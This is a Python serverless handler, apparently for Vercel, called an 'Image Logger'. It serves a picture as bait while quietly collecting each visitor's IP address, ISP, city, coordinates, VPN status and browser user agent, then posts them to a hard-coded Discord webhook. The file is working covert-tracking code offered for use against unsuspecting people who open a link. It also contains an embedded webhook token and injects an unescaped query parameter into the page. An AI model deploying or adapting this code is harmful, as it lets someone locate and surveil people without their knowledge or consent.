from http.server import BaseHTTPRequestHandler
from urllib import parse
import json
import urllib.request

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Your webhook URL
        WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
        IMAGE = "https://tse3.mm.bing.net/th/id/OIP.-ZtApdSarXwnPdnoTISdtwHaFj?rs=1&pid=ImgDetMain&o=7&rm=3"
        
        # Get IP and User Agent
        ip = self.headers.get('X-Forwarded-For', self.client_address[0])
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        # Get IP info
        try:
            ip_info_url = f"http://ip-api.com/json/{ip}?fields=16976857"
            with urllib.request.urlopen(ip_info_url) as response:
                info = json.loads(response.read().decode())
        except:
            info = {}
        
        # Parse query for custom image
        query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
        image_url = query.get('url', IMAGE)
        
        # Create Discord embed
        embed = {
            "username": "Image Logger",
            "content": "@everyone",
            "embeds": [{
                "title": "🎯 Image Logger - IP Logged",
                "color": 65280,
                "description": f"""**A User Opened the Image!**

**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{info.get('lat', 'N/A')}, {info.get('lon', 'N/A')}`
> **Timezone:** `{info.get('timezone', 'Unknown')}`
> **VPN:** `{info.get('proxy', False)}`
> **Mobile:** `{info.get('mobile', False)}`

**User Agent:**
```
{user_agent}
```""",
                "thumbnail": {"url": image_url},
                "footer": {"text": "Vercel Image Logger"}
            }]
        }
        
        # Send to webhook
        try:
            data = json.dumps(embed).encode('utf-8')
            req = urllib.request.Request(WEBHOOK, data=data, headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req)
        except:
            pass
        
        # Return HTML with image
        html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Image</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #000;
        }}
        img {{
            max-width: 100%;
            max-height: 100vh;
            object-fit: contain;
        }}
    </style>
</head>
<body>
    <img src="{image_url}" alt="Image">
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
        return
